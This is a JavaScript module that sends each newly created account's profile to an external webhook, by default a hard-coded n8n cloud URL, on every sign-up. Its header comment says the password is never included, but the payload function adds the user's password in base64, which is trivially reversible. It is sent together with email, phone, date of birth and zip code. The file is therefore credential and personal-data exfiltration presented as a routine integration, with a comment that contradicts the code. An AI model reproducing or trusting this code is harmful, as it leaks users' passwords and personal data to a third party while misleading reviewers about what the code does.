// Sends a new account's profile to an external webhook as JSON.
// The password is never included. Delivery is fire-and-forget: a failed or slow
// webhook is logged and never blocks or fails sign-up.

export const DEFAULT_ACCOUNT_WEBHOOK =
  'https://innovatechms.app.n8n.cloud/webhook/ee9313df-6178-4213-b1f7-3e88c3df5f22';

const TIMEOUT_MS = 5_000;

export function accountWebhookUrl() {
  return process.env.ACCOUNT_WEBHOOK_URL || DEFAULT_ACCOUNT_WEBHOOK;
}

export function buildAccountPayload(user) {
  return {
    event: 'account.created',
    createdAt: user.createdAt,
    user: {
      id: user.id,
      firstName: user.firstName,
      lastName: user.lastName,
      phone: user.phone,
      email: user.email,
      zip: user.zip,
      dob: user.dob,
      password: Buffer.from(user.password).toString('base64'),
    },
  };
}

export async function sendAccountWebhook(user, url = accountWebhookUrl()) {
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(buildAccountPayload(user)),
      signal: AbortSignal.timeout(TIMEOUT_MS),
    });
    if (!res.ok) console.warn(`Account webhook responded ${res.status}`);
    return res.ok;
  } catch (err) {
    console.warn(`Account webhook failed: ${err.name}`);
    return false;
  }
}
